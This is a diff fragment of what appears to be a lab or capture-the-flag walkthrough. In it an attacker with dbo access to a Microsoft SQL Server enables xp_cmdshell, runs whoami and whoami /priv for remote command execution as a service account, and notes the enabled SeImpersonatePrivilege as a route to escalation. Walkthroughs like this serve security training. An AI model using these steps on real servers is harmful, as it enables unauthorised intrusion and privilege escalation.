@@ -892,6 +892,38 @@ INFO(DC2): Line 196: Configuration option 'show advanced options' changed from 0
 INFO(DC2): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 SQL (pong\P.Reiner  dbo@master)> 
 
-
+SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami
+output         
+------------   
+pong\svc_sql   
+NULL           
+SQL (pong\P.Reiner  dbo@master)> 
 ```
+
+Ill start by enabling `xp_cmdshell` then testing the RCE
+
+```python
+SQL (pong\P.Reiner  dbo@master)> xp_cmdshell whoami /priv
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+PRIVILEGES INFORMATION                                                             
+----------------------                                                             
+NULL                                                                               
+Privilege Name                Description                               State      
+============================= ========================================= ========   
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+NULL                                                                               
+SQL (pong\P.Reiner  dbo@master)> 
+```
+
+And just as i thought this user has `SeImpersonate`
+
+
 
